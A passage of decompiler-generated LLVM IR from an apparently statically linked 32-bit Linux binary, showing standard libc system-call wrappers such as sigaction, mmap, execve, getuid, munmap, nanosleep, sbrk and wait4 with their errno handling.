  %v1_8051772 = icmp eq i1 %v5_805176b, false
  br i1 %v1_8051772, label %dec_label_pc_8051780, label %dec_label_pc_8051774

dec_label_pc_8051774:                             ; preds = %dec_label_pc_8051731
  br label %dec_label_pc_8051780

dec_label_pc_8051780:                             ; preds = %dec_label_pc_8051774, %dec_label_pc_8051731, %entry
  %v1_8051782 = icmp eq i32 %arg3, 0
  br i1 %v1_8051782, label %dec_label_pc_805178a, label %dec_label_pc_8051786

dec_label_pc_8051786:                             ; preds = %dec_label_pc_8051780
  %v2_8051786 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_805178a

dec_label_pc_805178a:                             ; preds = %dec_label_pc_8051780, %dec_label_pc_8051786
  %v0_8051799 = phi i32 [ 0, %dec_label_pc_8051780 ], [ %v2_8051786, %dec_label_pc_8051786 ]
  br i1 %v1_805172d, label %dec_label_pc_8051797, label %dec_label_pc_8051790

dec_label_pc_8051790:                             ; preds = %dec_label_pc_805178a
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8051797

dec_label_pc_8051797:                             ; preds = %dec_label_pc_805178a, %dec_label_pc_8051790
  %v0_805179a = phi %sigaction* [ null, %dec_label_pc_805178a ], [ %phitmp, %dec_label_pc_8051790 ]
  %v5_80517a2 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_805179a, i32 %v0_8051799, i32 8)
  store i32 %v5_80517a2, i32* %ebx.global-to-local, align 4
  br i1 %v1_8051782, label %dec_label_pc_80517e5, label %dec_label_pc_80517b0

dec_label_pc_80517b0:                             ; preds = %dec_label_pc_8051797
  %v2_80517b0 = icmp slt i32 %v5_80517a2, 0
  br i1 %v2_80517b0, label %dec_label_pc_80517e5, label %dec_label_pc_80517b4

dec_label_pc_80517b4:                             ; preds = %dec_label_pc_80517b0
  %v3_80517b4 = load i32, i32* %stack_var_-288, align 4
  %v2_80517b8 = inttoptr i32 %arg3 to i32*
  store i32 %v3_80517b4, i32* %v2_80517b8, align 4
  %v2_80517c0 = ptrtoint i32* %stack_var_-276 to i32
  %v1_80517c5 = add i32 %arg3, 4
  %v3_80517c9 = inttoptr i32 %v1_80517c5 to i16*
  %v4_80517c9 = call i32 @memcpy(i16* %v3_80517c9, i32 %v2_80517c0, i32 128)
  %v2_80517d2 = add i32 %arg3, 132
  %v3_80517d2 = inttoptr i32 %v2_80517d2 to i32*
  %v2_80517df = add i32 %arg3, 136
  %v3_80517df = inttoptr i32 %v2_80517df to i32*
  %v0_80517e5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80517e5

dec_label_pc_80517e5:                             ; preds = %dec_label_pc_80517b0, %dec_label_pc_8051797, %dec_label_pc_80517b4
  %v0_80517e5 = phi i32 [ %v5_80517a2, %dec_label_pc_80517b0 ], [ %v5_80517a2, %dec_label_pc_8051797 ], [ %v0_80517e5.pre, %dec_label_pc_80517b4 ]
  store i32 %v0_8051718, i32* @ebx, align 4
  store i32 %v0_8051717, i32* @esi, align 4
  ret i32 %v0_80517e5

; uselistorder directives
  uselistorder i1 %v1_8051782, { 1, 0 }
  uselistorder i1 %v1_805172d, { 1, 0 }
  uselistorder i32* null, { 1, 5, 2, 6, 7, 8, 9, 10, 11, 0, 12, 13, 14, 15, 16, 3, 4 }
  uselistorder i32 %arg3, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_80517e5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051797, { 1, 0 }
  uselistorder label %dec_label_pc_805178a, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_80517f3 = load i32, i32* @eax, align 4
  %v1_80517f5 = sub i32 0, %v0_80517f3
  %v1_80517f7 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_80517fc = inttoptr i32 %v1_80517f7 to i32*
  store i32 %v1_80517f5, i32* %v2_80517fc, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8051808 = load i32, i32* @ebx, align 4
  %v2_805180f = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_805180f, i32* @ebx, align 4
  %v8_8051813 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8051808, i32* @ebx, align 4
  %v3_805181c = icmp ugt i32 %v8_8051813, -4096
  call void @__pseudo_cond_branch(i1 %v3_805181c, i32 134551536)
  ret i32 %v8_8051813

; uselistorder directives
  uselistorder i32 %v8_8051813, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134551536, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051824 = load i32, i32* @ebx, align 4
  store i32 %v0_8051824, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8051837 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8051837, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8051837, -4095
  br i1 %tmp8, label %dec_label_pc_8051850, label %dec_label_pc_8051844

dec_label_pc_8051844:                             ; preds = %entry
  %v0_8051844 = load i32, i32* %stack_var_-4, align 4
  %v1_8051844 = call i32 @__errno_location(i32 %v0_8051844)
  %v0_8051849 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051849 = sub i32 0, %v0_8051849
  %v2_805184b = inttoptr i32 %v1_8051844 to i32*
  store i32 %v1_8051849, i32* %v2_805184b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051850

dec_label_pc_8051850:                             ; preds = %entry, %dec_label_pc_8051844
  %v0_8051850 = phi i32 [ %v1_8051837, %entry ], [ -1, %dec_label_pc_8051844 ]
  %v2_8051852 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051852, i32* @edx, align 4
  %v2_8051854 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051854, i32* @ebx, align 4
  ret i32 %v0_8051850

; uselistorder directives
  uselistorder i32 %v1_8051837, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051850, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051859 = load i32, i32* @esi, align 4
  store i32 %v0_8051859, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805186d = load i32, i32* @ebx, align 4
  %v7_8051875 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8051875, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_8051875, -4095
  br i1 %tmp13, label %dec_label_pc_805188d, label %dec_label_pc_8051881

dec_label_pc_8051881:                             ; preds = %entry
  %v1_8051881 = call i32 @__errno_location(i32 %v0_805186d)
  %v0_8051886 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051886 = sub i32 0, %v0_8051886
  %v2_8051888 = inttoptr i32 %v1_8051881 to i32*
  store i32 %v1_8051886, i32* %v2_8051888, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805188d

dec_label_pc_805188d:                             ; preds = %entry, %dec_label_pc_8051881
  %v0_805188d = phi i32 [ %v7_8051875, %entry ], [ -1, %dec_label_pc_8051881 ]
  %v2_8051890 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051890, i32* @esi, align 4
  ret i32 %v0_805188d

; uselistorder directives
  uselistorder i32 %v7_8051875, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805188d, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051894 = load i32, i32* @ebx, align 4
  store i32 %v0_8051894, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80518a7 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80518a7, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_80518a7, -4095
  br i1 %tmp9, label %dec_label_pc_80518c0, label %dec_label_pc_80518b4

dec_label_pc_80518b4:                             ; preds = %entry
  %v0_80518b4 = load i32, i32* %stack_var_-4, align 4
  %v1_80518b4 = call i32 @__errno_location(i32 %v0_80518b4)
  %v0_80518b9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80518b9 = sub i32 0, %v0_80518b9
  %v2_80518bb = inttoptr i32 %v1_80518b4 to i32*
  store i32 %v1_80518b9, i32* %v2_80518bb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80518c0

dec_label_pc_80518c0:                             ; preds = %entry, %dec_label_pc_80518b4
  %v0_80518c0 = phi i32 [ %v4_80518a7, %entry ], [ -1, %dec_label_pc_80518b4 ]
  %v2_80518c2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80518c2, i32* @edx, align 4
  %v2_80518c4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80518c4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80518c0

; uselistorder directives
  uselistorder i32 %v4_80518a7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80518c0, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_80518c8 = load i32, i32* @edi, align 4
  store i32 %v0_80518c8, i32* %stack_var_-4, align 4
  %v4_80518cc = ptrtoint i8* %arg1 to i32
  store i32 %v4_80518cc, i32* %edi.global-to-local, align 4
  %v0_80518d8 = load i32, i32* @ebx, align 4
  %v5_80518e0 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_80518e0 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_80518e0 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80518e0, [1 x i8*] %v8_80518e0)
  store i32 %v9_80518e0, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_80518e0, -4095
  br i1 %tmp12, label %dec_label_pc_80518f8, label %dec_label_pc_80518ec

dec_label_pc_80518ec:                             ; preds = %entry
  %v1_80518ec = call i32 @__errno_location(i32 %v0_80518d8)
  %v0_80518f1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80518f1 = sub i32 0, %v0_80518f1
  %v2_80518f3 = inttoptr i32 %v1_80518ec to i32*
  store i32 %v1_80518f1, i32* %v2_80518f3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80518f8

dec_label_pc_80518f8:                             ; preds = %entry, %dec_label_pc_80518ec
  %v0_80518f8 = phi i32 [ %v9_80518e0, %entry ], [ -1, %dec_label_pc_80518ec ]
  %v2_80518fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80518fc, i32* %edi.global-to-local, align 4
  ret i32 %v0_80518f8

; uselistorder directives
  uselistorder i32 %v9_80518e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80518f8, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051900 = load i32, i32* @ebx, align 4
  store i32 %v0_8051900, i32* %stack_var_-4, align 4
  %v1_8051909 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8051909, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051909, -4095
  br i1 %tmp6, label %dec_label_pc_8051920, label %dec_label_pc_8051914

dec_label_pc_8051914:                             ; preds = %entry
  %v0_8051914 = load i32, i32* %stack_var_-4, align 4
  %v1_8051914 = call i32 @__errno_location(i32 %v0_8051914)
  %v0_8051919 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051919 = sub i32 0, %v0_8051919
  %v2_805191b = inttoptr i32 %v1_8051914 to i32*
  store i32 %v1_8051919, i32* %v2_805191b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051920

dec_label_pc_8051920:                             ; preds = %entry, %dec_label_pc_8051914
  %v0_8051920 = phi i32 [ %v1_8051909, %entry ], [ -1, %dec_label_pc_8051914 ]
  %v2_8051924 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051924, i32* @ebx, align 4
  ret i32 %v0_8051920

; uselistorder directives
  uselistorder i32 %v1_8051909, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051920, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051928 = load i32, i32* @ebx, align 4
  store i32 %v0_8051928, i32* %stack_var_-4, align 4
  %v1_8051931 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8051931, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051931, -4095
  br i1 %tmp6, label %dec_label_pc_8051948, label %dec_label_pc_805193c

dec_label_pc_805193c:                             ; preds = %entry
  %v0_805193c = load i32, i32* %stack_var_-4, align 4
  %v1_805193c = call i32 @__errno_location(i32 %v0_805193c)
  %v0_8051941 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051941 = sub i32 0, %v0_8051941
  %v2_8051943 = inttoptr i32 %v1_805193c to i32*
  store i32 %v1_8051941, i32* %v2_8051943, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051948

dec_label_pc_8051948:                             ; preds = %entry, %dec_label_pc_805193c
  %v0_8051948 = phi i32 [ %v1_8051931, %entry ], [ -1, %dec_label_pc_805193c ]
  %v2_805194c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805194c, i32* @ebx, align 4
  ret i32 %v0_8051948

; uselistorder directives
  uselistorder i32 %v1_8051931, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051948, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051950 = load i32, i32* @ebx, align 4
  store i32 %v0_8051950, i32* %stack_var_-4, align 4
  %v1_8051959 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8051959, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051959, -4095
  br i1 %tmp6, label %dec_label_pc_8051970, label %dec_label_pc_8051964

dec_label_pc_8051964:                             ; preds = %entry
  %v0_8051964 = load i32, i32* %stack_var_-4, align 4
  %v1_8051964 = call i32 @__errno_location(i32 %v0_8051964)
  %v0_8051969 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051969 = sub i32 0, %v0_8051969
  %v2_805196b = inttoptr i32 %v1_8051964 to i32*
  store i32 %v1_8051969, i32* %v2_805196b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051970

dec_label_pc_8051970:                             ; preds = %entry, %dec_label_pc_8051964
  %v0_8051970 = phi i32 [ %v1_8051959, %entry ], [ -1, %dec_label_pc_8051964 ]
  %v2_8051974 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051974, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051970

; uselistorder directives
  uselistorder i32 %v1_8051959, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051970, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051978 = load i32, i32* @ebx, align 4
  store i32 %v0_8051978, i32* %stack_var_-4, align 4
  %v1_8051981 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8051981, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051981, -4095
  br i1 %tmp6, label %dec_label_pc_8051998, label %dec_label_pc_805198c

dec_label_pc_805198c:                             ; preds = %entry
  %v0_805198c = load i32, i32* %stack_var_-4, align 4
  %v1_805198c = call i32 @__errno_location(i32 %v0_805198c)
  %v0_8051991 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051991 = sub i32 0, %v0_8051991
  %v2_8051993 = inttoptr i32 %v1_805198c to i32*
  store i32 %v1_8051991, i32* %v2_8051993, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051998

dec_label_pc_8051998:                             ; preds = %entry, %dec_label_pc_805198c
  %v0_8051998 = phi i32 [ %v1_8051981, %entry ], [ -1, %dec_label_pc_805198c ]
  %v2_805199c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805199c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051998

; uselistorder directives
  uselistorder i32 %v1_8051981, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051998, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80519a0 = load i32, i32* @edi, align 4
  %v0_80519a1 = load i32, i32* @esi, align 4
  store i32 %v0_80519a1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_80519b9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_80519c1 = call i32 @mremap(i32 %v0_80519b9, i32 %v0_80519a1, i32 %v0_80519a0, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_80519b9, i32* @ebx, align 4
  store i32 %v6_80519c1, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_80519c1, -4095
  br i1 %tmp11, label %dec_label_pc_80519d9, label %dec_label_pc_80519cd

dec_label_pc_80519cd:                             ; preds = %entry
  %v1_80519cd = call i32 @__errno_location(i32 %v0_80519b9)
  %v0_80519d2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80519d2 = sub i32 0, %v0_80519d2
  %v2_80519d4 = inttoptr i32 %v1_80519cd to i32*
  store i32 %v1_80519d2, i32* %v2_80519d4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80519d9

dec_label_pc_80519d9:                             ; preds = %entry, %dec_label_pc_80519cd
  %v0_80519d9 = phi i32 [ %v6_80519c1, %entry ], [ -1, %dec_label_pc_80519cd ]
  %v2_80519db = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80519db, i32* @edx, align 4
  %v2_80519dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80519dc, i32* @esi, align 4
  store i32 %v0_80519a0, i32* @edi, align 4
  ret i32 %v0_80519d9

; uselistorder directives
  uselistorder i32 %v6_80519c1, { 1, 0, 2 }
  uselistorder i32 %v0_80519b9, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80519d9, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80519e0 = load i32, i32* @ebx, align 4
  store i32 %v0_80519e0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80519f3 = call i32 @munmap(i32 %v0_80519e0, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_80519f3, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_80519f3, -4095
  br i1 %tmp8, label %dec_label_pc_8051a0c, label %dec_label_pc_8051a00

dec_label_pc_8051a00:                             ; preds = %entry
  %v0_8051a00 = load i32, i32* %stack_var_-4, align 4
  %v1_8051a00 = call i32 @__errno_location(i32 %v0_8051a00)
  %v0_8051a05 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a05 = sub i32 0, %v0_8051a05
  %v2_8051a07 = inttoptr i32 %v1_8051a00 to i32*
  store i32 %v1_8051a05, i32* %v2_8051a07, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051a0c

dec_label_pc_8051a0c:                             ; preds = %entry, %dec_label_pc_8051a00
  %v0_8051a0c = phi i32 [ %v4_80519f3, %entry ], [ -1, %dec_label_pc_8051a00 ]
  %v2_8051a0e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051a0e, i32* @edx, align 4
  %v2_8051a10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051a10, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051a0c

; uselistorder directives
  uselistorder i32 %v4_80519f3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051a0c, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a14 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a14, i32* %stack_var_-4, align 4
  %v4_8051a18 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8051a18, i32* %ebx.global-to-local, align 4
  %v6_8051a27 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8051a27, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v6_8051a27, -4095
  br i1 %tmp10, label %dec_label_pc_8051a40, label %dec_label_pc_8051a34

dec_label_pc_8051a34:                             ; preds = %entry
  %v0_8051a34 = load i32, i32* %stack_var_-4, align 4
  %v1_8051a34 = call i32 @__errno_location(i32 %v0_8051a34)
  %v0_8051a39 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a39 = sub i32 0, %v0_8051a39
  %v2_8051a3b = inttoptr i32 %v1_8051a34 to i32*
  store i32 %v1_8051a39, i32* %v2_8051a3b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051a40

dec_label_pc_8051a40:                             ; preds = %entry, %dec_label_pc_8051a34
  %v0_8051a40 = phi i32 [ %v6_8051a27, %entry ], [ -1, %dec_label_pc_8051a34 ]
  %v2_8051a44 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051a44, i32* @ebx, align 4
  ret i32 %v0_8051a40

; uselistorder directives
  uselistorder i32 %v6_8051a27, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051a40, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8051a49 = load i32, i32* @ebx, align 4
  %v0_8051a4d = load i32, i32* @global_var_805e744.258, align 4
  %v1_8051a4d = icmp eq i32 %v0_8051a4d, 0
  %v1_8051a58 = icmp eq i1 %v1_8051a4d, false
  br i1 %v1_8051a58, label %dec_label_pc_8051a6b, label %dec_label_pc_8051a5a

dec_label_pc_8051a5a:                             ; preds = %entry
  %v1_8051a5f = call i32 @__GI_brk(i32 0)
  %v2_8051a67 = icmp slt i32 %v1_8051a5f, 0
  br i1 %v2_8051a67, label %dec_label_pc_8051a8d, label %dec_label_pc_8051a5a.dec_label_pc_8051a6b_crit_edge

dec_label_pc_8051a5a.dec_label_pc_8051a6b_crit_edge: ; preds = %dec_label_pc_8051a5a
  %v0_8051a6d.pre = load i32, i32* @global_var_805e744.258, align 4
  br label %dec_label_pc_8051a6b

dec_label_pc_8051a6b:                             ; preds = %dec_label_pc_8051a5a.dec_label_pc_8051a6b_crit_edge, %entry
  %v0_8051a7b = phi i32 [ %v0_8051a6d.pre, %dec_label_pc_8051a5a.dec_label_pc_8051a6b_crit_edge ], [ %v0_8051a4d, %entry ]
  %v1_8051a6b = icmp eq i32 %arg1, 0
  %v1_8051a72 = icmp eq i1 %v1_8051a6b, false
  br i1 %v1_8051a72, label %dec_label_pc_8051a78, label %dec_label_pc_8051a74

dec_label_pc_8051a74:                             ; preds = %dec_label_pc_8051a6b
  br label %dec_label_pc_8051a90

dec_label_pc_8051a78:                             ; preds = %dec_label_pc_8051a6b
  store i32 %v0_8051a7b, i32* @ebx, align 4
  %v2_8051a7d = add i32 %v0_8051a7b, %arg1
  %v1_8051a81 = call i32 @__GI_brk(i32 %v2_8051a7d)
  %v2_8051a89 = icmp slt i32 %v1_8051a81, 0
  %v1_8051a8b = icmp eq i1 %v2_8051a89, false
  br i1 %v1_8051a8b, label %dec_label_pc_8051a78.dec_label_pc_8051a90_crit_edge, label %dec_label_pc_8051a8d

dec_label_pc_8051a78.dec_label_pc_8051a90_crit_edge: ; preds = %dec_label_pc_8051a78
  %v0_8051a90.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051a90

dec_label_pc_8051a8d:                             ; preds = %dec_label_pc_8051a78, %dec_label_pc_8051a5a
  br label %dec_label_pc_8051a90

dec_label_pc_8051a90:                             ; preds = %dec_label_pc_8051a78.dec_label_pc_8051a90_crit_edge, %dec_label_pc_8051a74, %dec_label_pc_8051a8d
  %v0_8051a90 = phi i32 [ %v0_8051a90.pre, %dec_label_pc_8051a78.dec_label_pc_8051a90_crit_edge ], [ %v0_8051a7b, %dec_label_pc_8051a74 ], [ -1, %dec_label_pc_8051a8d ]
  %v2_8051a92 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051a92, i32* @edx, align 4
  store i32 %v0_8051a49, i32* @ebx, align 4
  ret i32 %v0_8051a90

; uselistorder directives
  uselistorder i32 %v0_8051a7b, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8051a90, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051a98 = load i32, i32* @edi, align 4
  %v0_8051a99 = load i32, i32* @esi, align 4
  store i32 %v0_8051a99, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8051aad = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8051ab5 = call i32 @wait4(i32 %v0_8051aad, i32 %v0_8051a99, i32 %v0_8051a98, i32 %tmp5)
  store i32 %v0_8051aad, i32* @ebx, align 4
  store i32 %v4_8051ab5, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8051ab5, -4095
  br i1 %tmp10, label %dec_label_pc_8051acd, label %dec_label_pc_8051ac1

dec_label_pc_8051ac1:                             ; preds = %entry
  %v1_8051ac1 = call i32 @__errno_location(i32 %v0_8051aad)
  %v0_8051ac6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ac6 = sub i32 0, %v0_8051ac6
  %v2_8051ac8 = inttoptr i32 %v1_8051ac1 to i32*
  store i32 %v1_8051ac6, i32* %v2_8051ac8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051acd

dec_label_pc_8051acd:                             ; preds = %entry, %dec_label_pc_8051ac1
  %v0_8051acd = phi i32 [ %v4_8051ab5, %entry ], [ -1, %dec_label_pc_8051ac1 ]
  %v2_8051ad0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051ad0, i32* @esi, align 4
  store i32 %v0_8051a98, i32* @edi, align 4
  ret i32 %v0_8051acd

; uselistorder directives
  uselistorder i32 %v4_8051ab5, { 1, 0, 2 }
  uselistorder i32 %v0_8051aad, { 1, 0, 2 }
